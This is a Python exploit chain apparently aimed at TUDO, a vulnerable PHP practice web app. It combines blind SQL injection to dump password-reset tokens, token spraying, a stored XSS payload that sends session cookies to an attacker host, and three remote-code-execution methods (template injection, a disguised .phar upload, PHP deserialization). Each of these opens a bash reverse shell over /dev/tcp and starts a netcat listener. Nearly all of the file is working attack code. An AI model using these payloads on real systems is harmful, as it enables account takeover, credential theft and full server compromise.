import requests
import sys
import time
import random
import string
from typing import Optional

class TUDOExploit:
    def __init__(self, target: str, host: str, username: str = "user1", chain: int = 1):
        self.target = target
        self.host = host
        self.username = username
        self.chain = chain
        self.new_password = "HACKED"
        self.base_url = f"http://{target}"
        self.session = requests.Session()
        self.phpsessid = None

    def request_reset(self, username: str) -> bool:
        """Request password reset for a username"""
        url = f"{self.base_url}/forgotpassword.php"
        data = {'username': username}

        try:
            response = self.session.post(url, data=data, timeout=10)
            print(f"[DEBUG] Reset request response: {response.status_code}")
            return 'Email sent!' in response.text
        except requests.RequestException as e:
            print(f"[-] Error requesting reset: {e}")
            return False
        
    def oracle(self, q_left: str, q_op: str, q_right: str) -> bool:
        """SQL injection oracle to test conditions"""
        url = f"{self.base_url}/forgotusername.php"
        payload = f"admin' and {q_left}{q_op}{q_right}"
        data = {'username': payload}

        try:
            response = self.session.post(url, data=data, timeout=10)
            return 'User exists!' in response.text
        except requests.RequestException as e:
            print(f"[-] Oracle error: {e}")
            return False
        
    def change_password(self, token: str) -> bool:
        url = f"{self.base_url}/resetpassword.php"
        data = {
            'token': token,
            'password1': self.new_password,
            'password2': self.new_password
        }

        try:
            response = self.session.post(url, data=data, timeout=10)
            print(f"[DEBUG] Password change response: {response.status_code}")
            return 'Password changed!' in response.text
        except requests.RequestException as e:
            print(f"[-] Error changing password: {e}")
            return False
        
    def test_vulnerability(self) -> bool:
        """Test if target is vulnerable"""
        true_test = self.oracle("1", "=", "'1")
        false_test = self.oracle("0", "=", "'1")

        return true_test and not false_test
    
    def dump_uid(self) -> Optional[int]:
        """Dump the UID for the target username"""
        sql_template = "(select uid from users where username='{}')"
        uid = 0

        while uid < 1000:
            if self.oracle(sql_template.format(self.username), "=", f"'{uid}"):
                return uid
            uid += 1

        print("[-] Failed to dump UID")
        return None
    
    def dump_token(self, uid: int) -> Optional[str]:
        """Dump the reset token using binary search"""
        dumped = ""
        sql_template = "(select ascii(substr(token, {}, 1)) from tokens where uid={} limit 1)"

        for i in range(1, 33):
            char_found = self._binary_search_char(i, uid, sql_template)
            if char_found is None:
                print(f"[-] Failed to dump character at position {i}")
                return None
            dumped += char_found

        return dumped
    
    def _binary_search_char(self, position: int, uid: int, sql_template: str) -> Optional[str]:
        """Binary search for a single character"""
        low, high = 32, 127

        while low <= high:
            mid = (high + low) // 2

            # Test greater than
            if self.oracle(sql_template.format(position, uid), ">", f"'{mid}"):
                low = mid + 1
            elif self.oracle(sql_template.format(position, uid), "<", f"'{mid}"):
                high = mid - 1
            # Found exact match
            else:
                return chr(mid)
            
        return None
    
    def login(self, username: str, password: str) -> bool:
        """Attempt to login with the new credentials"""
        url = f"{self.base_url}/login.php"
        data = {
            'username': username,
            'password': password
        }

        try:
            print(f"[+] Attempting login with: {username}:{password}")
            response = self.session.post(url, data=data, timeout=10)
            
            # Check for successful login indicators
            success_indicators = [
                'Welcome',
                'Hello',
                'Logout',
                'Dashboard'
            ]

            # Check if any success indicator is in the response
            login_success = any(indicator in response.text for indicator in success_indicators)

            if login_success:
                print(f"[+] Login successful! Status: {response.status_code}")
                # Extract PHPSESSID from cookies
                if 'PHPSESSID' in self.session.cookies:
                    self.phpsessid = self.session.cookies['PHPSESSID']
                    print(f"[+] PHPSESSID obtained: {self.phpsessid}")
                return True
            else:
                print(f"[-] Login failed. Status: {response.status_code}")
                print(f"[DEBUG] Response: {response.text[:500]}...")
                return False
            
        except requests.RequestException as e:
            print(f"[-] Login error: {e}")
            return False

    def token_spray(self) -> bool:
        """Alternative to SQLi - token spraying attack"""
        print("[+] Attempting token spray attack...")
        
        # Generate common tokens or use wordlist
        common_tokens = [
            "00000000000000000000000000000000",
            "11111111111111111111111111111111",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "0123456789abcdef0123456789abcdef",
            "token123token123token123token123"
        ]
        
        for token in common_tokens:
            if self.change_password(token):
                print(f"[+] Password changed using token: {token}")
                return True
                
        print("[-] Token spray failed")
        return False

    def steal_cookie(self) -> bool:
        """XSS cookie stealing - matching steal_cookie.py functionality"""
        print("[+] Attempting XSS cookie theft...")
        
        lport = 9000
        
        # Login first (matching steal_cookie.py)
        login_url = f"{self.base_url}/login.php"
        login_data = {
            'username': self.username,
            'password': self.new_password
        }
        
        try:
            login_response = self.session.post(login_url, data=login_data, timeout=10)
            if "[MoTD]" not in login_response.text:
                print("[-] Failed to login for XSS attack")
                return False
            print("[+] Logged in for XSS attack!")
            
            # Set malicious description (matching steal_cookie.py)
            xss_payload = f"<script>document.write('<img src=http://{self.host}:{lport}/'+document.cookie+' />');</script>"
            profile_url = f"{self.base_url}/profile.php"
            profile_data = {"description": xss_payload}
            
            profile_response = self.session.post(profile_url, data=profile_data, timeout=10)
            if "Success" not in profile_response.text:
                print("[-] Failed to set malicious description")
                return False
                
            print("[+] Changed description with XSS payload!")
            print(f"[*] XSS payload set. Admin needs to trigger it.")
            print(f"[*] In real scenario, would wait for admin to visit.")
            
            # For automation, we'll assume success since we can't actually wait for admin
            print("[+] XSS cookie theft setup completed (requires admin interaction)")
            return True
            
        except requests.RequestException as e:
            print(f"[-] XSS setup error: {e}")
            return False


    def ssti_rce(self) -> bool:
        """SSTI RCE - matching set_motd.py functionality"""
        print("[+] Attempting SSTI RCE...")
        
        import subprocess
        import time
        import platform
        
        lport = 9001
        
        # Use the exact payload from set_motd.py
        payload = "{php}exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");{/php}" % (self.host, lport)
        
        url = f"{self.base_url}/admin/update_motd.php"
        cookies = {"PHPSESSID": self.phpsessid} if self.phpsessid else {}
        data = {"message": payload}
        
        try:
            response = self.session.post(url, data=data, cookies=cookies, timeout=10)
            print(f"[DEBUG] MoTD update response status: {response.status_code}")
            
            if "Message set!" in response.text or response.status_code == 200:
                print("[+] Changed MoTD!")
                
                # Start reverse shell listener - Windows compatible
                print(f"[*] Starting reverse shell on port {lport}...")
                try:
                    # Use ncat for Windows if available, or skip listener
                    if platform.system() == "Windows":
                        # Try ncat (from Nmap) first
                        subprocess.Popen(["ncat", "-lvp", str(lport)], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL,
                                    shell=True)
                    else:
                        # Linux/Mac
                        subprocess.Popen(["nc", "-nvlp", str(lport)], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL)
                    
                    time.sleep(2)
                    
                    # Trigger by accessing homepage
                    homepage_url = f"{self.base_url}/"
                    trigger_response = self.session.get(homepage_url, cookies=cookies, timeout=5)
                    print(f"[+] Triggered shell by accessing homepage")
                    
                    time.sleep(3)
                    print("[+] Reverse shell attempt completed (listener may not work on Windows)")
                    return True
                    
                except (subprocess.SubprocessError, FileNotFoundError) as e:
                    print(f"[-] Error starting listener: {e}")
                    print("[*] Continuing without reverse shell listener")
                    return True  # Return True anyway since the exploit worked
            else:
                print(f"[-] Failed to set MoTD. Response: {response.text[:200]}")
                return False
                
        except requests.RequestException as e:
            print(f"[-] MoTD update error: {e}")
            return False

    def image_upload_rce(self) -> bool:
        """Image upload RCE - matching image_upload.py functionality"""
        print("[+] Attempting image upload RCE...")
        
        import string
        import random
        import platform
        
        lport = 9001
        evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        
        # Create the exact payload from image_upload.py
        payload = f"GIF98a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{self.host}/{lport} 0>&1'\");?>"
        
        # Upload to the specific endpoint
        url = f"{self.base_url}/admin/upload_image.php"
        cookies = {"PHPSESSID": self.phpsessid} if self.phpsessid else {}
        
        files = {
            'image': (f'{evil}.phar', payload, 'image/gif'),
            'title': (None, evil)
        }
        
        try:
            response = self.session.post(url, files=files, cookies=cookies, allow_redirects=False, timeout=10)
            print(f"[DEBUG] Upload response status: {response.status_code}")
            
            if response.status_code == 200 or 'Success' in response.text:
                print(f"[+] Successfully uploaded script ({evil}.phar)!")
                
                # Windows compatibility - handle netcat listener appropriately
                if platform.system() == "Windows":
                    print("[*] Windows detected - skipping reverse shell listener")
                    print(f"[*] Shell script uploaded to: {self.base_url}/images/{evil}.phar")
                    print(f"[*] Reverse shell would connect to {self.host}:{lport} when accessed")
                    
                    # Still trigger the script to execute
                    shell_url = f"{self.base_url}/images/{evil}.phar"
                    trigger_response = self.session.get(shell_url, timeout=5)
                    print(f"[+] Triggered shell at {shell_url}")
                else:
                    # Original Linux code
                    import subprocess
                    import time
                    subprocess.Popen(["nc", "-nvlp", str(lport)], 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.DEVNULL)
                    time.sleep(2)
                    
                    # Trigger the shell by accessing the uploaded file
                    shell_url = f"{self.base_url}/images/{evil}.phar"
                    trigger_response = self.session.get(shell_url, timeout=5)
                    print(f"[+] Triggered shell at {shell_url}")
                    
                    time.sleep(3)
                    print("[+] Reverse shell should be connected (check your netcat listener)")
                
                return True
            else:
                print(f"[-] Upload failed. Response: {response.text[:200]}")
                return False
                
        except requests.RequestException as e:
            print(f"[-] Upload error: {e}")
            return False

    def php_deserialization_rce(self) -> bool:
        """PHP deserialization to RCE - matching deserialize.py functionality"""
        print("[+] Attempting PHP deserialization RCE...")
        
        import platform
        import string
        import random
        
        lport = 9001
        evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        
        # Create the payload exactly like deserialize.py
        f = f"/var/www/html/{evil}.php"
        c = f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{self.host}/{lport} 0>&1'\"); ?>"
        
        # Generate the serialized payload using PHP (matching serialize.php)
        try:
            # This should match what serialize.php does
            php_script = f"""
            <?php
            class FileObject {{
                public $filename = "{f}";
                public $filecontent = "{c}";
            }}
            
            class UserObject {{
                public $username = "test";
                public $file;
                
                public function __construct() {{
                    $this->file = new FileObject();
                }}
            }}
            
            $u = new UserObject();
            echo urlencode(serialize($u));
            ?>
            """
            
            # Execute PHP to generate the payload
            import subprocess
            result = subprocess.run(['php', '-r', php_script], 
                                capture_output=True, text=True, timeout=10)
            payload = result.stdout.strip()
            
            if not payload:
                # Fallback: create a simple serialized payload
                import urllib.parse
                payload = f'O:10:"UserObject":2:{{s:8:"username";s:4:"test";s:4:"file";O:10:"FileObject":2:{{s:8:"filename";s:{len(f)}:"{f}";s:11:"filecontent";s:{len(c)}:"{c}";}}}}'
                payload = urllib.parse.quote(payload)
                
            print(f"[+] Generated payload for file: {f}")
            
        except Exception as e:
            print(f"[-] Error generating payload: {e}")
            # Fallback payload
            import urllib.parse
            payload = f'O:10:"UserObject":2:{{s:8:"username";s:4:"test";s:4:"file";O:10:"FileObject":2:{{s:8:"filename";s:{len(f)}:"{f}";s:11:"filecontent";s:{len(c)}:"{c}";}}}}'
            payload = urllib.parse.quote(payload)
            print(f"[+] Using fallback payload for file: {f}")
        
        # Send to import_user.php endpoint (matching deserialize.py)
        url = f"{self.base_url}/admin/import_user.php"
        cookies = {"PHPSESSID": self.phpsessid} if self.phpsessid else {}
        data = {"userobj": payload}
        
        try:
            response = self.session.post(url, data=data, cookies=cookies, timeout=10)
            print(f"[DEBUG] Sent import user request to {url}")
            print(f"[DEBUG] Response status: {response.status_code}")
            
            if response.status_code == 200:
                print(f"[+] Payload sent successfully")
                
                # Windows compatibility - handle netcat listener appropriately
                if platform.system() == "Windows":
                    print("[*] Windows detected - skipping reverse shell listener")
                    print(f"[*] PHP file should be created at: {f}")
                    print(f"[*] Reverse shell would connect to {self.host}:{lport} when accessed")
                    
                    # Trigger the shell by accessing the created file
                    shell_url = f"{self.base_url}/{evil}.php"
                    trigger_response = self.session.get(shell_url, timeout=5)
                    print(f"[+] Triggered shell at {shell_url}")
                else:
                    # Original Linux code
                    import subprocess
                    import time
                    subprocess.Popen(["nc", "-nvlp", str(lport)], 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.DEVNULL)
                    time.sleep(2)
                    
                    # Trigger the shell by accessing the created file
                    shell_url = f"{self.base_url}/{evil}.php"
                    trigger_response = self.session.get(shell_url, timeout=5)
                    print(f"[+] Triggered shell at {shell_url}")
                    
                    time.sleep(3)
                    print("[+] Reverse shell should be connected (check your netcat listener)")
                
                return True
            else:
                print(f"[-] Failed to send payload. Status: {response.status_code}")
                return False
                
        except requests.RequestException as e:
            print(f"[-] Request error: {e}")
            return False

            
    def execute_chain(self) -> bool:
            """Execute the complete exploit chain matching the shell script"""
            print(f"[+] Starting exploit chain {self.chain} for target: {self.target}")
            print(f"[+] Host: {self.host}, User: {self.username}")

            # Step 1: Authentication Bypass (matches shell script)
            print("\nStep 1 - Authentication Bypass")
            print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
            
            if self.chain < 4:  # Chains 1-3: SQLi (dump_token.py)
                if not self.test_vulnerability():
                    print("[-] Target is not vulnerable to SQLi")
                    return False
                print("[+] Target is vulnerable to SQLi")

                print(f"[+] Requesting password reset for: {self.username}")
                if not self.request_reset(self.username):
                    print("[-] Failed to request password reset")
                    return False
                print("[+] Reset token created")

                print("[+] Dumping UID...")
                uid = self.dump_uid()
                if uid is None:
                    return False
                print(f"[+] UID dumped: {uid}")
                
                print("[+] Dumping token...")
                token = self.dump_token(uid)
                if token is None:
                    return False
                print(f"[+] Token dumped: {token}")

                print("[+] Changing password...")
                if not self.change_password(token):
                    print("[-] Failed to change password")
                    return False
                
            else:  # Chains 4-6: Token Spray (token_spray.py)
                if not self.token_spray():
                    print("[-] Token spray failed")
                    #return False

            print(f"[+] Success! Password changed to: {self.new_password}")

            # Step 2: Privilege Escalation (matches steal_cookie.py)
            print("\nStep 2 - Privilege Escalation")
            print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-")
            if not self.steal_cookie():
                print("[-] Privilege escalation setup completed (requires admin trigger)")
                # Continue anyway - in real scenario we'd need the admin cookie

            # Step 3: RCE (matches the RCE scripts)
            print("\nStep 3 - RCE")
            print("-=-=-=-=-=-=")
            
            # Match the shell script's logic exactly
            if (self.chain % 3) == 1:  # set_motd.py
                result = self.ssti_rce()
            elif (self.chain % 3) == 2:  # image_upload.py
                result = self.image_upload_rce()
            else:  # deserialize.py (chain % 3 == 0)
                result = self.php_deserialization_rce()
            
            if result:
                print("[+] RCE phase completed successfully!")
            else:
                print("[-] RCE phase failed")
                
            return True

def main():
    if len(sys.argv) not in [2, 5]:
        print(f"Usage: {sys.argv[0]} <TargetIP> [<Host> <User> <Chain>]")
        print("\nValid CHAIN values:")
        print("1 :: SQLi -> XSS -> SSTI")
        print("2 :: SQLi -> XSS -> Image Upload Bypass")
        print("3 :: SQLI -> XSS -> PHP Deserialization")
        print("4 :: Token Spray -> XSS -> SSTI")
        print("5 :: Token Spray -> XSS -> Image Upload Bypass")
        print("6 :: Token Spray -> XSS -> PHP Deserialization")
        sys.exit(1)

    if len(sys.argv) == 2:
        # Original behavior for backward compatibility
        target = sys.argv[1]
        exploit = TUDOExploit(target, "localhost", "user1", 1)
        if not exploit.execute_chain():
            sys.exit(1)
    else:
        target = sys.argv[1]
        host = sys.argv[2]
        user = sys.argv[3]
        chain = int(sys.argv[4])
        
        if chain < 1 or chain > 6:
            print("Error: Chain must be between 1 and 6")
            sys.exit(1)
            
        exploit = TUDOExploit(target, host, user, chain)
        if not exploit.execute_chain():
            sys.exit(1)

if __name__ == "__main__":
    main()